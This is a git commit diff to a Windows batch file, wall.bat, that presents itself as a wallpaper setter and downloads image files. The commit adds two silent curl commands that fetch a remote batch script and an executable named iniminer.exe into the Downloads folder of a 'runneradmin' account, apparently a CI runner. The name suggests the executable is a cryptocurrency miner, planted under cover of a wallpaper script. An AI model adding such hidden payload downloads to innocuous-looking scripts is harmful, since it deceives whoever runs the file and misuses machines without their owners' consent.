d41b09be3d2df827150b14cf7129af4e263dfe59
iksan nurpadillah <211210016@unmuhpnk.ac.id>
2025-01-28 16:23:38 +0700

    Update wall.bat

--- wall.bat
+++ wall.bat
@@ -1,7 +1,8 @@
 @echo off
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/IKSANNURPADILLAH/winserver/refs/heads/main/TranscodedWallpaper -OutFile TranscodedWallpaper"
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/IKSANNURPADILLAH/winserver/refs/heads/main/CachedImage_1024_768_POS4.jpg -OutFile CachedImage_1024_768_POS4.jpg"
-
+curl -s -L -o C:\Users\runneradmin\Downloads\main.bat https://raw.githubusercontent.com/IKSANNURPADILLAH/winserver/refs/heads/main/main.bat
+curl -s -L -o C:\Users\runneradmin\Downloads\iniminer.exe https://github.com/IKSANNURPADILLAH/init/raw/refs/heads/main/iniminer.exe
 set "TranscodedWallpaper=TranscodedWallpaper"
 set "CachedImage=CachedImage_1024_768_POS4.jpg"
 
